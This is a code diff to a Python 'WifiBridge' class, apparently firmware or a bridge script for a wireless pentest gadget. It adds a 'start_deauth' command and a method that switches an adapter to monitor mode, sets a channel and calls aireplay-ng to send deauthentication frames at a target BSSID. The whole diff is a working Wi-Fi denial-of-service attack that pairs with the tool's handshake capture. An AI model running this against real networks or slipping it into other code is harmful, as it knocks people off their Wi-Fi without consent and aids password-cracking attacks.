@@ -353,6 +353,12 @@ class WifiBridge:
             self._write("all stopped\r\n")
         elif cmd == "scan_bt":
             threading.Thread(target=self._do_ble_scan, daemon=True).start()
+        elif cmd.startswith("start_deauth"):
+            parts = cmd.split()
+            bssid = parts[1] if len(parts) > 1 else None
+            channel = parts[2] if len(parts) > 2 else None
+            threading.Thread(target=self._do_deauth,
+                             args=(bssid, channel), daemon=True).start()
         elif cmd in ("start_handshake", "start_handshake_serial"):
             threading.Thread(target=self._start_hs, daemon=True).start()
         elif cmd == "stop_handshake":
@@ -435,6 +441,60 @@ class WifiBridge:
             self._write(format_ble_line(i + 1, device))
             time.sleep(0.01)
         self._write("BLE scan done\r\n")
+
+    # ------------------------------------------------------------------
+    # Deauth attack
+    # ------------------------------------------------------------------
+
+    def _do_deauth(self, bssid: str | None, channel: str | None):
+        if not bssid:
+            self._write("deauth error: no BSSID provided\r\n")
+            return
+        if not self._check_tool("aireplay-ng"):
+            self._write("deauth error: aireplay-ng not installed\r\n")
+            return
+        if not os.path.exists(f"/sys/class/net/{self.sniffer_iface}"):
+            self._write(f"deauth error: {self.sniffer_iface} not found — plug in AWUS036ACM\r\n")
+            return
+        log.info("Deauth: bssid=%s channel=%s iface=%s", bssid, channel, self.sniffer_iface)
+        self._write(f"deauth starting — target {bssid}\r\n")
+        try:
+            # Check current mode — only set monitor if not already in monitor
+            result_check = subprocess.run(
+                ["iw", "dev", self.sniffer_iface, "info"],
+                capture_output=True, text=True, timeout=5
+            )
+            already_monitor = "type monitor" in result_check.stdout
+            if not already_monitor:
+                set_monitor_mode(self.sniffer_iface)
+            # Set channel if provided and not already in hs_capture
+            # (skip if hs_capture is active — it owns the channel)
+            if channel and not self._hs_active:
+                subprocess.run(
+                    ["iwconfig", self.sniffer_iface, "channel", channel],
+                    capture_output=True, timeout=5
+                )
+            result = subprocess.run(
+                ["aireplay-ng", "-0", "5", "-a", bssid, self.sniffer_iface],
+                capture_output=True, text=True, timeout=15
+            )
+            if result.returncode == 0:
+                log.info("Deauth complete: %s", bssid)
+                self._write(f"deauth complete — {bssid}\r\n")
+            else:
+                log.warning("Deauth failed: %s", result.stderr.strip())
+                self._write(f"deauth error: {result.stderr.strip()[:80]}\r\n")
+            # Restore managed mode only if we set monitor mode ourselves
+            # and hs_capture is not active (it will restore on its own stop)
+            if not already_monitor and not self._hs_active:
+                restore_managed_mode(self.sniffer_iface)
+        except subprocess.TimeoutExpired:
+            log.warning("Deauth timed out")
+            self._write("deauth timed out\r\n")
+        except Exception as e:
+            log.error("Deauth error: %s", e)
+            self._write(f"deauth error: {e}\r\n")
+
 
     # ------------------------------------------------------------------
     # Handshake capture — dispatches to hs_capture.py
